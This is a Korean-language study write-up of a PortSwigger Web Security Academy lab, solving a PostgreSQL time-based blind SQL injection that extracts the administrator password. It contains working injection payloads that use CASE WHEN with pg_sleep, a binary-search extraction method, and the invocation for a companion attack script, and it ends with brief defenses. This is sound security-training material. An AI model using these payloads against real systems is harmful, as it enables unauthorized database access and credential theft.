# Lab: Blind SQL injection with time delays and information retrieval

## 개요

- **난이도**: Practitioner
- **주제**: SQL Injection — Blind / Time-based Information Retrieval
- **링크**: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
- **참고**: https://portswigger.net/web-security/sql-injection/cheat-sheet
- **도구**: [tools/01-sqli-015-blind-time-delays-info-retrieval.py](../tools/01-sqli-015-blind-time-delays-info-retrieval.py)

## 목표

응답 시간 차이를 단서로 삼아 `administrator` 비밀번호를 추출하고 로그인한다.

## 014 랩과의 차이

014는 time delay로 **취약점 존재 여부만 확인**했다. 이 랩은 014에서 확인한 time delay 기법을 `CASE WHEN`과 결합하여 **실제 데이터를 추출**한다.

| 항목 | 014 | 015 |
|------|-----|-----|
| 목표 | 취약점 확인 | 비밀번호 추출 |
| 페이로드 | `pg_sleep(10)` 단순 실행 | `CASE WHEN (조건) THEN pg_sleep(N) ELSE pg_sleep(0)` |
| 단서 활용 | 지연 발생 여부 확인 | 지연 유무를 참/거짓 신호로 이진 탐색 |

## 페이로드 구조

```sql
' AND EXISTS(SELECT 1 FROM pg_sleep(
    CASE WHEN (<조건>) THEN 5 ELSE 0 END
))--
```

| 요소 | 역할 |
|------|------|
| `AND EXISTS(...)` | 서브쿼리를 실제로 실행시키는 컨텍스트 |
| `CASE WHEN (조건) THEN 5 ELSE 0` | 조건 참이면 5초, 거짓이면 0초를 pg_sleep에 전달 |
| `pg_sleep(N)` | N초 지연 유발 |

응답 시간이 임계값(기본 3초) 이상이면 조건이 참, 미만이면 거짓으로 판정한다.

## 풀이

### 1단계 — 취약점 확인

항상 참인 조건과 거짓인 조건의 응답 시간 차이를 확인한다.

```sql
-- 참 (5초 지연 기대)
' AND EXISTS(SELECT 1 FROM pg_sleep(CASE WHEN (1=1) THEN 5 ELSE 0 END))--

-- 거짓 (즉시 응답 기대)
' AND EXISTS(SELECT 1 FROM pg_sleep(CASE WHEN (1=2) THEN 5 ELSE 0 END))--
```

### 2단계 — 비밀번호 길이 탐색

```sql
' AND EXISTS(SELECT 1 FROM pg_sleep(
    CASE WHEN (SELECT LENGTH(password) FROM users WHERE username='administrator') > 10
         THEN 5 ELSE 0 END
))--
```

이진 탐색으로 범위를 좁혀 정확한 길이를 확정한다.

### 3단계 — 문자 추출

```sql
' AND EXISTS(SELECT 1 FROM pg_sleep(
    CASE WHEN SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1) > 'm'
         THEN 5 ELSE 0 END
))--
```

각 자리를 이진 탐색으로 추출하고 최종 후보 문자를 `=` 검증으로 확정한다.

### 스크립트 실행

```bash
python3 tools/01-sqli-015-blind-time-delays-info-retrieval.py \
  "https://xxxx.web-security-academy.net" \
  "TrackingId값"
```

## 핵심 정리

- `CASE WHEN (조건) THEN pg_sleep(N) ELSE pg_sleep(0) END`로 조건부 지연을 만들면 응답 시간이 참/거짓 신호가 된다.
- `AND EXISTS(SELECT 1 FROM pg_sleep(...))` 구조가 `||pg_sleep(...)` 보다 안정적으로 동작한다. (014 랩 참고)
- 이진 탐색 로직은 011·012와 동일하다. 판별 함수만 응답 내용·상태 코드 대신 **응답 시간**으로 교체된다.
- **방어**: Prepared Statement 사용, DB 함수 실행 권한 최소화.

## 배운 점 및 추가 학습

### 1. Blind SQLi 판별 수단 총정리

| 랩 | 판별 수단 | 판별 함수 |
|----|----------|-----------|
| 011 | 응답 본문 (`Welcome back!` 유무) | `SUCCESS_MARKER in resp.text` |
| 012 | HTTP 상태 코드 (500 vs 200) | `resp.status_code == 500` |
| 015 | 응답 시간 (지연 여부) | `elapsed >= DELAY_THRESHOLD` |

이진 탐색 구조 자체는 세 랩 모두 동일하다. 환경이 제공하는 단서에 따라 판별 방법만 교체하면 된다.

### 2. Time-based의 고유한 어려움

Time-based는 다른 방법이 모두 막혔을 때 마지막으로 시도하는 방법이지만, 그만큼 다루기 어려운 부분이 있다.

| 문제 | 내용 | 대응 |
|------|------|------|
| 네트워크 지연과 구분 | 서버 응답 지연인지 DB 지연인지 구분 어려움 | sleep 시간을 충분히 크게 설정 (5초 이상) |
| 오탐 가능성 | 네트워크 불안정으로 거짓 양성 발생 | 임계값을 sleep의 절반 이하로 설정 |
| 속도 문제 | 조건 참일 때마다 N초 대기 | 병렬 처리로 완화 (단, 스레드 수 제한 필요) |
| 서버 부하 | 과도한 병렬 요청으로 서버 응답 지연 왜곡 | 스레드 수를 낮게 유지 (기본 5) |

### 3. 스레드 수를 낮게 설정하는 이유

011·012는 기본 스레드 10개를 사용했지만, 015는 5개로 줄인다.

```
011·012: 요청 즉시 응답 → 스레드 10개여도 서버 부하 적음
015:     조건 참이면 5초 대기 → 스레드 10개 × 5초 = 동시에 50초치 연결 점유
          → 서버 과부하 → 응답 시간 왜곡 → 오탐 증가
```

### 4. 추가로 고민해볼 것

- sleep 시간과 임계값은 대상 서버의 평소 응답 속도에 맞게 조정해야 한다. 평소 응답이 1초라면 sleep 5초 / 임계값 3초가 적절하다.
- 동일한 조건을 여러 번 반복해서 과반수로 판정하면 오탐을 줄일 수 있지만 그만큼 요청 수가 늘어난다.
